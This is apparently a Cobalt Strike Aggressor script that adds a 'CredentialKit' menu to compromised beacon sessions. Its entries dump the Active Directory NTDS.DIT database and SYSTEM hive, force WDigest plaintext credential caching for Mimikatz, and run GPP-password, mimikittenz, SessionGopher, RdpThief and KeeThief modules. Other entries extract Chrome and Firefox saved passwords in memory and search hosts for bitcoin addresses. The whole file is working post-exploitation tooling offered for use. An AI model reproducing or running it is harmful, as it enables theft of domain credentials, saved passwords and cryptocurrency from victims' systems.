# module path setting
$module_path = 'modules/';

popup beacon_bottom {
    menu "CredentialKit" {

        item "Extract NTDS.DIT"{
            local('$bid');
            foreach $bid ($1) {
                bpowershell_import($1, script_resource("modules/Invoke-NinjaCopy.ps1"));
                bpowerpick($1, 'Invoke-NinjaCopy -Path "C:\Windows\ntds\ntds.dit" -LocalDestination "C:\Windows\temp\ntds.dit"');
                bpowerpick($1, 'Invoke-NinjaCopy -Path "C:\Windows\system32\config\SYSTEM" -LocalDestination "C:\Windows\temp\SYSTEM"');
                bshell($1, 'dir /a C:\Windows\temp\\');
            }
        }

        item "Silver Ticket" {
            include(script_resource("scripts/sliver-ticket.cna"));
        }

        item "SafetyKatz" {
            
        }

        item "Mimikatz Pass Change"{
            include(script_resource("scripts/mimikatz-pass-change.cna"));
        }
        
        # Enable mimikatz to dump credentials on Win Server2012
        item "Win12 Enable Mimikatz" {
            local('$bid');
            foreach $bid ($1){
                bshell($1, "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f");
            }
        }

        item "Get GPP Password"{
            local('$bid');
            foreach $bid ($1) {
                binput($bid, "powershell-import Get-GPPPassword.ps1");
                bpowershell_import($bid, script_resource("modules/Get-GPPPassword.ps1"));
                binput($bid, "powershell Get-GPPPassword");
                bpowerpick($bid, "Get-GPPPassword");
            }
        }

        item "Proxy Hash Steal" {
            include(script_resource("scripts/proxy-hash-steal.cna"));
        }

        item "Invoke-mimikittenz" {
            local('$bid');
            foreach $bid ($1) {
                binput($bid, "powershell-import Invoke-mimikittenz.ps1");
                bpowershell_import($bid, script_resource("modules/Invoke-mimikittenz.ps1"));
                binput($bid, "powershell Invoke-mimikittenz");
                bpowershell($bid, "Invoke-mimikittenz");
            }
        }

        menu "Password Dump" {
            
            item "SessionGopher" {
                local ('$bid');
                foreach $bid ($1) {
                    bpowershell_import($bid, script_resource("modules/SessionGopher.ps1"));
                    bcd($bid, "C:\\Temp");
                    bpowershell($bid, "Invoke-SessionGopher -o");
                }
            }

            item "RdpThief" {
                include(script_resource("scripts/RdpThief.cna"));
            }
        
            item "Navicat Decrypt"{
                bexecute_assembly($bid, script_resource("modules/navicat-pwd-decrypt.exe"));
            }

            item "Find KeePass Config"{
                local('$bid');
                foreach $bid ($1) {
                    binput($1, "powershell-import KeePassConfig.ps1");
                    bpowershell_import($bid, script_resource("modules/KeePassConfig.ps1"));
                    binput($bid, "powershell Find-KeePassconfig");
                    bpowershell($bid, "Find-KeePassconfig");
                }
            }

            item "KeePass Master key"{
                local('$bid');
                foreach $bid ($1) {
                    binput($bid, "powershell-import KeeThief.ps1");
                    bpowershell_import($bid, script_resource("modules/KeeThief.ps1"));
                    binput($bid, "powershell Get-KeePassDatabaseKey -Verbose");
                    bpowershell($bid, "Get-KeePassDatabaseKey -Verbose");
                }
            }

            item "KeeThief" {
                include(script_resource("scripts/KeeThief.cna"));
            }

            item "Get Firefox Passwords"{
                local('$bid');
                    foreach $bid ($1){
                        binput($1, "powershell-import Get-FirefoxPasswords.ps1");
                        # read in the powershell script
                        $handle = openf(script_resource("modules/Get-FirefoxPasswords.ps1"));
                        $firefox_script = readb($handle, -1);
                        closef($handle);
                        # host firefox script on beacon
                        $cmd = beacon_host_script($1, $firefox_script);
                        binput($bid, "powershell Get-FirefoxPasswords");
                        sleep(5 * 1000);
                        # execute in-memory hosted script
                        bpowerpick($1, "$cmd");
                    }
            }

            item "Get Chrome Passwords"{
                local('$bid');
                foreach $bid ($1){
                    binput($1, "powershell-import Get-ChromePasswords.ps1");
                    # read in the powershell script
                    $handle = openf(script_resource("modules/Get-ChromePasswords.ps1"));
                    $chrome_script = readb($handle, -1);
                    closef($handle);
                    $cmd = beacon_host_script($bid, $chrome_script);
                    binput($bid, "powerpick Get-ChromePasswords");
                    sleep(50 * 1000);
                    # execute in-memory hosted script
                    bpowerpick($bid, "$cmd");
                }
            }

            item "ChromeDump Mimikatz"{
                # use mimikatz to dump password stored by chrome, this method is only effective for desktop user session.
                blog($1, "[*] 备份chrome密码存储数据库");
                bshell($1, "copy \"%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data\" \"%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data1\"");
                
                blog($1, "[*] 使用mimikatz导出密码列表");
                bmimikatz($1, "dpapi::chrome /in:\"%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data1\" /unprotect");
                
                blog($1, "[*] 删除备份数据库文件");
                bshell($1, "del \"%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data1\"");
            }
        }
    }
}

popup ssh {
    menu "CredentialKit" {
        item "Find bitcoin addresses"{
            local('$bid');
            foreach $bid ($1){
                bshell($1, 'egrep "^[13][a-km-zA-HJ-NP-Z0-9]{26,33}$" / -R 2>/dev/null');
            }
        }
    }
}